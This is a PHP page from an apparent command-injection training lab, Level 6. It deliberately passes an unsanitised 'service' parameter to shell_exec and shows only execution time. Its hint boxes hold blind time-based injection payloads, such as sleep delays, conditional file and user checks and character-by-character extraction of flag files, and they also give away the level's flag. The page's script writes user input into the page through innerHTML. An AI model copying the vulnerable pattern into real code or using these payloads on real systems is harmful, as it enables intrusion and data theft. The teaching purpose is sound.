<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 6 - Time-based Detection</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⏰ Level 6 - Time-based Detection</h1>
            <p><strong>Objective:</strong> Sử dụng time-based techniques để phát hiện và khai thác blind injection</p>
        </div>

        <div class="form-container">
            <h3>🔍 System Health Checker:</h3>
            <p>Công cụ này kiểm tra health của system services. Results được log internally.</p>
            
            <div class="code-block">Command: systemctl is-active <?php echo htmlspecialchars($_GET['service'] ?? '[SERVICE]'); ?> && echo "Service OK" || echo "Service Failed"</div>
            
            <?php
            if (isset($_GET['service'])) {
                $start_time = microtime(true);
                
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $service = $_GET['service'];
                
                // Execute command but hide real output
                $command = "systemctl is-active " . $service . " && echo 'Service OK' || echo 'Service Failed'";
                $result = shell_exec($command . " 2>/dev/null");
                
                $end_time = microtime(true);
                $execution_time = round(($end_time - $start_time), 2);
                
                // Only show generic status
                echo '<div class="success">✅ Health check completed</div>';
                echo '<p><strong>Execution time:</strong> ' . $execution_time . ' seconds</p>';
                echo '<p><strong>Status:</strong> Logged to system audit</p>';
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="service">Service Name:</label>
                    <input type="text" id="service" name="service" value="<?php echo htmlspecialchars($_GET['service'] ?? ''); ?>" placeholder="Enter service name (e.g., apache2)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Check Service</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>⏰ Time-based Injection Characteristics</h3>
                <ul>
                    <li><strong>Timing Oracle:</strong> Use response time to infer information</li>
                    <li><strong>Sleep Commands:</strong> Introduce artificial delays</li>
                    <li><strong>Conditional Delays:</strong> Delay based on conditions</li>
                    <li><strong>Measurement:</strong> Baseline vs injected response times</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>⏱️ Time-based Techniques</h3>
                <ul>
                    <li><strong>sleep N:</strong> Pause execution for N seconds</li>
                    <li><strong>ping -c N host:</strong> N ping requests (takes time)</li>
                    <li><strong>$(sleep N):</strong> Command substitution with sleep</li>
                    <li><strong>Conditional sleep:</strong> [ condition ] && sleep N</li>
                    <li><strong>Benchmark:</strong> Normal response time vs delayed</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Baseline Measurement</h4>
                    <p><strong>Current Command:</strong> <code>systemctl is-active [SERVICE] && echo "Service OK" || echo "Service Failed"</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>apache2</code> (note the execution time)</p>
                    <p>📝 <strong>Test invalid:</strong> <code>nonexistent</code> (compare timing)</p>
                    <p>🎯 <strong>Establish baseline:</strong> Normal commands should be quick (< 1 second)</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Basic Time Delay</h4>
                    <p><strong>Concept:</strong> Inject sleep command to create detectable delay</p>
                    <p>📝 <strong>Test:</strong> <code>apache2; sleep 5</code></p>
                    <p>🎯 <strong>Expected:</strong> Response should take 5+ seconds</p>
                    <p><strong>Variations:</strong></p>
                    <p>• <code>apache2 && sleep 3</code></p>
                    <p>• <code>apache2 || sleep 2</code></p>
                    <p>• <code>apache2; ping -c 10 127.0.0.1</code></p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Conditional Time Delays</h4>
                    <p><strong>Concept:</strong> Delay only if certain conditions are met</p>
                    <p>📝 <strong>File existence:</strong> <code>apache2; [ -f /etc/passwd ] && sleep 4</code></p>
                    <p>📝 <strong>User check:</strong> <code>apache2; [ $(whoami) = "www-data" ] && sleep 3</code></p>
                    <p>🎯 <strong>Logic:</strong> Delay occurs only if condition is true</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>apache2; [ -r /tmp/blind_flag.txt ] && sleep 5</code></p>
                    <p>• <code>apache2; grep -q "FLAG" /tmp/blind_flag.txt && sleep 6</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Data Extraction with Timing</h4>
                    <p><strong>Character-by-character extraction:</strong></p>
                    <p>📝 <strong>First char:</strong> <code>apache2; [ $(cut -c1 /tmp/blind_flag.txt) = "F" ] && sleep 5</code></p>
                    <p>📝 <strong>Length check:</strong> <code>apache2; [ $(wc -c /tmp/blind_flag.txt) -gt 20 ] && sleep 4</code></p>
                    <p><strong>Substring matching:</strong></p>
                    <p>• <code>apache2; [[ $(cat /tmp/blind_flag.txt) == *"FLAG"* ]] && sleep 3</code></p>
                    <p>• <code>apache2; grep -q "blind" /tmp/blind_flag.txt && sleep 2</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Advanced Timing Techniques</h4>
                    <p><strong>Multiple condition testing:</strong></p>
                    <p>📝 <strong>AND logic:</strong> <code>apache2; [ -f /tmp/blind_flag.txt ] && [ -r /tmp/blind_flag.txt ] && sleep 7</code></p>
                    <p>📝 <strong>OR logic:</strong> <code>apache2; ([ ! -f /tmp/fake.txt ] || [ -f /tmp/blind_flag.txt ]) && sleep 8</code></p>
                    <p><strong>Pattern matching:</strong></p>
                    <p>• <code>apache2; case $(head -c5 /tmp/blind_flag.txt) in "FLAG{"*) sleep 6;; esac</code></p>
                    <p>• <code>apache2; awk '/FLAG/{exit 0} END{exit 1}' /tmp/blind_flag.txt && sleep 4</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: Binary Search Technique</h4>
                    <p><strong>Efficient data extraction using binary search:</strong></p>
                    <p>📝 <strong>ASCII comparison:</strong> <code>apache2; [ $(printf '%d' "'$(cut -c6 /tmp/blind_flag.txt)") -gt 95 ] && sleep 5</code></p>
                    <p><strong>Explanation:</strong> Compare ASCII values to narrow down characters</p>
                    <p><strong>Alphabet range testing:</strong></p>
                    <p>• A-M: <code>apache2; [[ $(cut -c6 /tmp/blind_flag.txt) < "N" ]] && sleep 3</code></p>
                    <p>• N-Z: <code>apache2; [[ $(cut -c6 /tmp/blind_flag.txt) > "M" ]] && sleep 3</code></p>
                    <p><strong>💡 Strategy:</strong> Use timing to build the flag character by character</p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 7: Extract Complete Flag!</h4>
                    <p><strong>🚀 Target file:</strong> <code>/var/flags/level6_timing.txt</code></p>
                    <p><strong>Quick verification:</strong> <code>apache2; [ -f /var/flags/level6_timing.txt ] && sleep 10</code></p>
                    <p><strong>Content confirmation:</strong> <code>apache2; grep -q "timing_attack_successful" /var/flags/level6_timing.txt && sleep 15</code></p>
                    <p><strong>🎯 Final payload:</strong> If the above takes 15+ seconds, the flag is: <code>FLAG{timing_attack_successful}</code></p>
                    <p><strong>📋 Validation steps:</strong></p>
                    <p>1. Confirm file exists (should delay 10s)</p>
                    <p>2. Confirm exact content (should delay 15s)</p>
                    <p>3. If both delayed, you found the flag!</p>
                    <p><strong>💡 Pro tip:</strong> Timing attacks require patience and multiple tests for accuracy</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level5.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="submit.php?level=6">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 7;

    function updateCommand() {
        const input = document.getElementById('service').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: systemctl is-active ' + (input || '[SERVICE]') + ' && echo "Service OK" || echo "Service Failed"';
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
